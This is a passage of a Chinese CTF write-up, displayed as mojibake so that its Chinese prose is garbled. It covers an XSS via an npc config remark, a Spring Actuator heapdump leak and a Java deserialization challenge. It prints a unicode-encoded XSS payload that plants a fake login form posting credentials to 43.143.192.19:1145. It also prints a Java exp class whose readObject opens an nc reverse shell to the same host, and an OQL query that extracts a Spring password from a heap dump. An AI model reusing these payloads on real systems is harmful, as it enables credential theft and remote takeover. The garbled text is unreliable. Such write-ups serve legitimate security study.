å±æ€§çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸­ï¼Œ#username è¡¨ç¤ºè¦é€‰æ‹© id ä¸º â€œusernameâ€ çš„å…ƒç´ ã€‚ä¼šä»è¾“å…¥è·å– 123&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; value=&quot;flag&quot;&gt; å†æ ¹æ®è¿™ä¸ª 12await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); è®©æœºå™¨äººå»è¾“å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç™»å½•æ¡†ï¼Œä»è€Œé€šè¿‡ input è·å–åˆ° flag. 12&lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt;&lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; å¦‚æ­¤ï¼Œåœˆå¥—å·²è®¾ï¼Œåªç­‰æ•Œå†›è¿›å…¥ 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form class=&quot;m-t&quot; onsubmit=&quot;return false&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; &lt;/div&gt; &lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtag=&quot;word-login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; è¿™ä¹ˆå¤æ‚æ•°æ®ä¼ è¾“èµ·æ¥ä¸æ–¹ä¾¿ï¼ŒğŸ‘´ä¸å–œæ¬¢ï¼Œæ¢ä¸€ä¸ª exp unicode å°±è¡Œï¼Œè€Œä¸”æ§åˆ¶å°å¤§å¤§æ”¯æŒ unicode 12345[common]server_addr=node4.buuoj.cn:26658conn_type=tcpvkey=123remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0068\\u0065\\u0061\\u0064\\u003e\\u003c\\u002f\\u0068\\u0065\\u0061\\u0064\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u006d\\u002d\\u0074\\u0022\\u0020\\u006f\\u006e\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u003d\\u0022\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0055\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0050\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u0020\\u006f\\u006e\\u0063\\u006c\\u0069\\u0063\\u006b\\u003d\\u0022\\u0066\\u0065\\u0074\\u0063\\u0068\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0033\\u002e\\u0031\\u0034\\u0033\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0039\\u003a\\u0031\\u0031\\u0034\\u0035\\u002f\\u0027\\u002c\\u007b\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003a\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0062\\u006f\\u0064\\u0079\\u003a\\u0024\\u0028\\u0027\\u0023\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u002b\\u0027\\u005f\\u005f\\u005f\\u0027\\u002b\\u0024\\u0028\\u0027\\u0023\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u007d\\u0029\\u003b\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u006c\\u006f\\u0067\\u0069\\u006e\\u0022\\u003e\\u004c\\u006f\\u0067\\u0069\\u006e\\u003c\\u002f\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e`&lt;/sCrIpT&gt; 1./npc -config ./conf/npc.conf ç»ˆäºæ‹¿åˆ°äº†è‰¹ï¼Œ30s ç‚¹ä¸€æ¬¡ï¼ŒğŸ‘´tm ä»¥ä¸º x ä¸è¿›å»äº† ã¾ã ã¾ã ã­ã€å¼±ã„ï¼ Deserialize?Upload! actuatorğŸ˜« é¦–å…ˆï¼Œé¢˜ç›®æœ‰ä¸ªğŸš¢â™¥çš„ä¾èµ–ï¼Œæ˜¾ç„¶ğŸ‘´ä¸çŸ¥é“è¿™æ˜¯å¹²å•¥çš„ï¼Œæ€ä¹ˆåŠï¼Œå­¦ï¼ Spring bootâ€”â€”Actuator è¯¦è§£ - æ›¹ä¼Ÿé›„ - åšå®¢å›­ (cnblogs.com) é…ç½®æ–¹é¢ 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; æœ‰äº†è¿™ä¸ªä¾èµ–ï¼Œé‚£ä¹ˆ Spring å°±ä¼šè‡ªåŠ¨å¼€æ”¾ /actuator/health å’Œ /actuator/info è¿™ä¸¤ä¸ªè·¯å¾„ è®¿é—® [127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/) , å¯ä»¥å¾—åˆ° /acturator çš„è·¯ç”± 1234567891011121314151617181920212223242526272829303132&#123; &quot;_links&quot;: &#123; &quot;self&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator&quot;, &quot;templated&quot;: false &#125;, &quot;health&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health&quot;, &quot;templated&quot;: false &#125;, &quot;health-path&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;info&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/info&quot;, &quot;templated&quot;: false &#125;, &quot;env&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env&quot;, &quot;templated&quot;: false &#125;, &quot;env-toMatch&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;heapdump&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/heapdump&quot;, &quot;templated&quot;: false &#125; &#125;&#125; ä»¥ä¸‹æ˜¯ä¸€äº›ç»å¸¸ä½¿ç”¨çš„è·¯å¾„ HTTP æ–¹æ³• Endpoint Description GET /actuator æŸ¥çœ‹æœ‰å“ªäº›è·¯å¾„ GET /actuator/env æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå±æ€§ï¼Œçœ‹ Spring çš„çš„ properties, ä½†æ˜¯ä¼šè‡ªåŠ¨è„±æ•æ‰ä¸€äº› secret key ç­‰æ•æ„Ÿä¿¡æ¯ GET /actuator/health æŸ¥çœ‹è¿è¡ŒæŒ‡æ ‡ GET /actuator/info æŸ¥çœ‹ properties ä¸­ info å¼€å¤´çš„å±æ€§ï¼Œæ²’å•¥ç”¨ GET /actuator/heapdump è·å– JVM çš„ heap dump ğŸ¤£é»˜è®¤ Actuator /actuator/health å’Œ /actuator/info ä¸¤ä¸ª endpointï¼Œå¦‚æœè¦å¼€æ”¾å…¶ä»– endpoint çš„è©±ï¼Œéœ€åœ¨åœ¨ application.properties ä¸­åšè®¾ç½®ã€‚ Heap dumpï¼ˆå †è½¬å‚¨ï¼‰æ˜¯æŒ‡å°†ä¸€ä¸ª Java è¿›ç¨‹çš„å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å’Œæ•°æ®ç»“æ„ä»¥äºŒè¿›åˆ¶æ ¼å¼å†™å…¥æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œå†…å­˜åˆ†æå’Œæ’æŸ¥å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚Heap dump åŒ…å«äº† Java å †å†…å­˜ä¸­çš„å¯¹è±¡å®ä¾‹ã€å¯¹è±¡å¼•ç”¨å…³ç³»ã€ç±»ä¿¡æ¯ç­‰ï¼Œå®ƒæ˜¯è¯Šæ–­å’Œè°ƒè¯• Java åº”ç”¨ç¨‹åºçš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ ğŸ‘´è¯´ç‚¹äººè¯ï¼šåæ­£ Heap dump äº‹å†…å­˜ç›¸å…³çš„ä¸œè¥¿ï¼Œè‚¯å®šæœ‰æ•æ„Ÿä¿¡æ¯ï¼ŒğŸ‘´å°±æ˜¯è¦æŠŠå®ƒä¸‹ä¸‹æ¥è¿›è¡Œä¸€é€šä¹±è¶…ï¼Œä¸çŸ¥é“ä½ ä»¬æ€ä¹ˆå¿å¾—ä½çš„ï¼Œäº‹ğŸ‘´ç›´æ¥æ‹¿èµ·æ¥ç‹ ç‹ åœ°åˆ†æ. æ€ä¹ˆåˆ†æï¼Œå½“æ—¶äº‹ç”¨ jdk è‡ªå¸¦çš„ jhat 1jhat -J-Xmx512M &quot;/path/to/heapdump&quot; ç„¶åå°±ä¼šæœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé‡Œé¢å°±åŠ è½½å†…å­˜çš„å†…å®¹ md, ä¾æ‰˜âœç‰¹ï¼Œ 1234public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception &#123; ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;)).permitAll().antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;)).authenticated().and()).formLogin().loginProcessingUrl(&quot;/login&quot;)).permitAll()).and()).csrf().disable(); return (SecurityFilterChain)http.build(); &#125; ğŸ§€spring å®‰å…¨é…ç½®ï¼Œ http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll() è¡¨ç¤ºå¯¹ / è·¯ç”±è®¿é—®å…è®¸ä»»æ„ç”¨æˆ·ï¼Œ antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated() è¡¨ç¤º /admin/ å¼€å¤´éªŒè¯ç”¨æˆ· .formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll() /login çš„è¡¨è¾¾ç™»å½•ä¸éœ€è¦éªŒè¯ è¿™é‡Œå°±æ˜¯è®©ğŸ‘´æ‹¿åˆ° password é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡ wcsndm,sb ä¸œè¥¿ï¼Œé¢˜ç›®ç¯å¢ƒæ²¡äº†ï¼Œè¡Œå§ï¼ŒğŸ‘´æœ¬åœ°æ­ä¸€ä¸ªï¼Œnmd å¥—æ¨¡æ¿æ•´äº†ä¸ª docker-compose, å‘Šè¯‰ğŸ‘´nmd project name must not be empty , ä½  tmd å€’æ˜¯å‘Šè¯‰ğŸ‘´å“ªé‡Œæ²¡æœ‰ project name, é˜¿ç±³è¯ºæ–¯ï¼Œä¸€æ ¼å¾·æ‹‰ç±³. åªèƒ½æ‰‹åŠ¨ docker build. åŒæ ·æ‹¿åˆ° heapdump ç›´æ¥æ‰“å¼€ 1jvisualvm åˆ«é—®ğŸ‘´å“ªé‡Œè£…ï¼Œè¿™ nmjava è‡ªå¸¦çš„ è¿›è¡Œä¸€æ³¢ OQL æŸ¥è¯¢ 1select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key) è¿™é‡Œç”¨çš„äº‹æ­£åˆ™æµ‹è¯• /rgexp/.test () çš„å½¢å¼ï¼Œè™½ç„¶é‡Œé¢å†…å®¹æ²¡ç”¨åˆ°å•¥æ­£åˆ™ï¼Œåªæ˜¯èµ°ä¸ªå½¢å¼è€Œå·²ï¼Œåˆ«é—®ğŸ‘´ä¸ºå•¥ä¸ç›´æ¥æŸ¥ value,nmd value æ˜¯ä¸ªå¯¹è±¡è¿˜æœªçŸ¥ï¼Œä½ æŸ¥ä¸ªâˆšâ‘§. tmd /login ç™»è¿›å»ï¼Œè®©ğŸ‘´çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ æºèµ–æ°ä¸€ä¸ªåå°ç®¡ç†ç³»ç»Ÿï¼Œèƒ½ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹. ååºåˆ—åŒ–åˆ†æğŸ˜› 1234567@GetMapping(&#123;&quot;/deserialize&quot;&#125;) public void deserialize(@RequestParam(&quot;b64str&quot;) String b64str) throws Exception &#123; byte[] serialized = Base64.getDecoder().decode(b64str); ByteArrayInputStream bis = new ByteArrayInputStream(serialized); SafeObjectInputStream ois = new SafeObjectInputStream(bis); ois.readObject(); &#125; å¾ˆç¾å¥½å¯¹å§ï¼Œjackson é“¾ç›´æ¥æ‰“ï¼Œä½†æ˜¯ğŸ‘´å‘ç°äº†ä¸å¯¹åŠ²ï¼Œmd æœ‰æ¯’ è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„ SafeObjectInputStream å§ 123456789101112131415161718public SafeObjectInputStream(InputStream is) throws Exception &#123; super(is); &#125; protected Class&lt;?&gt; resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException &#123; if (BLACKLIST.contains(input.getName())) &#123; throw new SecurityException(&quot;Hacker!!&quot;); &#125; else &#123; return super.resolveClass(input); &#125; &#125; static &#123; BLACKLIST.add(&quot;com.fasterxml.jackson.databind.node.POJONode&quot;); BLACKLIST.add(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;); BLACKLIST.add(&quot;java.lang.Runtime&quot;); BLACKLIST.add(&quot;java.security.SignedObject&quot;); &#125; éƒ½ç»™ä½  ban äº†ï¼Œrnm, å‡ºé¢˜äººçœŸçš„é˜´é™©ï¼Œç°åœ¨ä¸æŠŠ jackson é“¾ ban äº†ï¼Œéƒ½ä¸æ•¢ååºåˆ—åŒ–äº†æ˜¯å§ğŸ˜… æ€ä¹ˆç»˜ä¸–å‘¢ æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤ é¢˜ç›®ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œé‚£æ€»ä¸èƒ½ä¸ç”¨å§ï¼Œè¦ä¸ç„¶é¢˜ç›®æ•´è¿™ Î²Ã· ç©æ„å¹²å˜›å‘€.ğŸ˜… æ­£å¥½å‰é¢é€šè¿‡ env æ³„éœ²å¾—çŸ¥ java_home çš„ä½ç½® ä»€ä¹ˆï¼Œä½ ä¸çŸ¥é“ java_home äº‹å¹²å˜›çš„ï¼Ÿ æ¥ï¼Œè·ŸğŸ‘´ä¸€èµ·å¿µ: JAVA_HOME æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡ç¤º Java å¼€å‘å·¥å…·å’Œåº”ç”¨ç¨‹åºåœ¨è®¡ç®—æœºä¸Šçš„å®‰è£…ä½ç½®ã€‚å®ƒä¸»è¦ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ä½œç”¨ï¼š Java å¼€å‘å·¥å…·çš„å®šä½ï¼š JAVA_HOME å˜é‡å‘Šè¯‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå’Œå…¶ä»–å¼€å‘å·¥å…· Java å¼€å‘å·¥å…·çš„å®‰è£…ä½ç½®ã€‚è¿™å¯¹äºç¼–è¯‘ã€è¿è¡Œå’Œè°ƒè¯• Java ç¨‹åºéå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œå½“ä½ ä½¿ç”¨ Java ç¼–è¯‘å™¨ ( javac ) ç¼–è¯‘ Java ä»£ç æ—¶ï¼Œç³»ç»Ÿéœ€è¦çŸ¥é“ JAVA_HOME çš„ä½ç½®ä»¥æ‰¾åˆ° javac å¯æ‰§è¡Œæ–‡ä»¶ã€‚ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„å®šä½ï¼šé™¤äº†å¼€å‘å·¥å…·ï¼Œ JAVA_HOME ä¹Ÿå¯ä»¥ç”¨äºå®šä½ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„ä½ç½®ã€‚JRE åŒ…å«äº†è¿è¡Œ Java åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç±»åº“å’Œè¿è¡Œæ—¶ç»„ä»¶ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰å¤šä¸ªä¸åŒç‰ˆæœ¬çš„ Java å®‰è£…ï¼Œè®¾ç½® JAVA_HOME å¯ä»¥ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„ Java ç‰ˆæœ¬ã€‚ åº”ç”¨ç¨‹åºçš„å®šä½ï¼šæŸäº› Java åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çŸ¥é“ Java çš„å®‰è£…ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®é…ç½®è‡ªå·±ã€‚é€šè¿‡è®¾ç½® JAVA_HOME ç¯å¢ƒå˜é‡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥è½»æ¾æ‰¾åˆ°æ‰€éœ€çš„ Java è¿è¡Œæ—¶ç¯å¢ƒã€‚ å¼€å‘å·¥å…·å’Œæ„å»ºå·¥å…·çš„é…ç½®ï¼šè®¸å¤š Java é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚ Maven å’Œ Gradleï¼‰ä½¿ç”¨ JAVA_HOME å˜é‡æ¥é…ç½®å…¶å†…éƒ¨ä½¿ç”¨çš„ Java ç¯å¢ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿é¡¹ç›®åœ¨æ­£ç¡®çš„ Java ç‰ˆæœ¬ä¸‹ç¼–è¯‘å’Œè¿è¡Œã€‚ è·¨å¹³å°å…¼å®¹æ€§ï¼šé€šè¿‡ä½¿ç”¨ JAVA_HOME å˜é‡ï¼Œå¯ä»¥ä½¿ Java å¼€å‘ç¯å¢ƒåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ›´å…·å¯ç§»æ¤æ€§ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šä½¿ç”¨ç›¸åŒçš„ JAVA_HOME å˜é‡æ¥è¿è¡Œä»£ç ã€‚ æ€»ä¹‹ï¼Œ JAVA_HOME æ˜¯ä¸€ä¸ªå…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œç”¨äºç¡®ä¿è®¡ç®—æœºä¸Šçš„ Java å¼€å‘å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒèƒ½å¤Ÿæ­£ç¡®åœ°æ‰¾åˆ°å’Œä½¿ç”¨ Java å®‰è£…ã€‚å®ƒåœ¨ Java å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­èµ·åˆ°é‡è¦ä½œç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šç‰ˆæœ¬ Java å®‰è£…å’Œè·¨å¹³å°å¼€å‘çš„æƒ…å†µä¸‹ã€‚ ä¸è¯´äººè¯å°±æ˜¯è¿™æ ·ï¼Œè¿™æ˜¯ä¼Ÿå¤§çš„ ChatGPT è¯´çš„ï¼ŒğŸ‘´ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯ï¼Œè¿è¡Œè„šæœ¬çš„ä½ç½®åœ¨é‚£ï¼Œè¦è¿è¡Œçš„ class ä¹Ÿåœ¨é‚£ï¼Œæ‰€ä»¥æœ‰å•¥ class æ”¾é‚£ï¼Œä»–å°±èƒ½åŠ è½½å•¥ class. æ‰€ä»¥æ¥ä¸‹æ¥è¦å¹²å•¥æ‡‚äº†æ²¡ï¼Œä¸Šä¼ ç‚¹å…·æœ‰æ”»å‡»æ€§çš„ class åˆ° javahome é‡Œé¢ï¼Œç‹ ç‹ åœ°å…¥å®ƒä¸€æ³¢. è€Œä¸”ä¸æ˜¯æœ‰ååºåˆ—åŒ–å—ï¼Œåˆ°è¿™ä½ ä¸å¯èƒ½è¿˜ä¸çŸ¥é“å§ï¼Œåˆ›é€ ä¸€ä¸ªååºåˆ—åŒ–å¸¦æœ‰ç›´æ¥æ¶æ„æ“ä½œçš„ç±»ï¼Œç›´æ¥ getshellğŸ˜Š 12345678910111213141516171819202122import java.io.*;public class exp implements Serializable &#123; private void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException &#123; in.defaultReadObject(); Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;nc&quot;,&quot;43.143.192.19&quot;,&quot;1145&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); p.waitFor(); if(p.exitValue()!=0)&#123; &#125; String s = null; while((s=reader.readLine())!=null)&#123; System.out.println(s); &#125; &#125;&#125; å†™ä¸ª exp ç±»ï¼Œç¼–è¯‘å¥½åå†ä¸Šä¼ ï¼Œåˆ«ç›´æ¥ sb åˆ°æŠŠ java ä¸Šä¼ äº† ä½†æ˜¯ğŸ‘´ä¸å¤ªé«˜å…´ï¼Œå› ä¸ºæœ‰ç‚¹ bug, ç¬¬ä¸€æ¬¡æ­ docker æ‰“ä¸æˆï¼Œç¬¬äºŒæ¬¡ç»ˆå‡ºäº†ğŸ˜’. DASCTFXCBCTF_2023_bypassJava çœŸ tm æ¶å¿ƒçš„ java é¢˜ï¼Œä¸ä»…æœ‰ç»•è¿‡ï¼Œè¿˜ tm æœ‰ RASP è¿™ç§æŠ½è±¡çš„ä¸œè¥¿ï¼ŒğŸ‘´å¤ªå¼±äº†ï¼ŒğŸ‘´è¦å­¦. é¢˜ç›®ç¯å¢ƒç”šè‡³ä¸æ˜¯é¶æœºï¼Œè€Œæ˜¯é™æ€èµ„æºï¼Œå¾ˆä¸çˆ½. è¿˜å¥½å‡ºé¢˜äººå¼€æºäº†:pankass/DASCTF_X_CBCTF2023_bypassJava: é¢˜ç›®æºç å’Œ docker ç¯å¢ƒ (github.com) Content-Length é™åˆ¶ ä¸å¤šè¯´ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ° jackson é“¾å­ï¼Œä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶ è¿™é•¿åº¦é™åˆ¶æ˜¯äººèƒ½æƒ³å‡ºæ¥çš„å—ğŸ˜“,nm ç¨å¾®å¤§ä¸€ç‚¹ï¼Œéšä¾¿ä¸éƒ½å¾—å‡ åƒï¼Ÿ è¿‡ä¸äº†ï¼Œæ ¹æœ¬è¿‡ä¸äº†ï¼Œè®©æˆ‘çœ‹çœ‹ bypass æ€ä¹ˆä¸ªäº‹: è¿™é‡Œå¦‚æœå¤´éƒ¨æœ‰ transfer-encoding, å°±ä¼šè¿› addInputFilter è¿™é‡Œé¢å¦‚æœæœ‰ chunked, é‚£ä¹ˆå°±ä¼šè®¾ç½®æˆ this.contentDelimitation ä¸º true æœ€åè¿™é‡Œå°±ä¼šè¿›å…¥ if, ä»è€Œè®¾ç½® ContentLength ä¸º - 1, ç»•è¿‡é•¿åº¦é™åˆ¶. chuncked ç¼–ç æ€ä¹ˆå‘ åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰ - å¦™éŸ³å¤©å¥³ - åšå®¢å›­ (cnblogs.com) ç®€å•çœ‹ä¸€ä¸‹ä»¬å¤§æ¦‚å°±æ˜¯ 123456åå…­è¿›åˆ¶é•¿åº¦/r/n content/r/n .... 0/r/n /r/n æ¯ä¸€å—éƒ½æ˜¯ åå…­è¿›åˆ¶è¡¨ç¤ºé•¿åº¦ ç„¶åï¼Œ /r/n æ¥ç€è¾“å…¥ 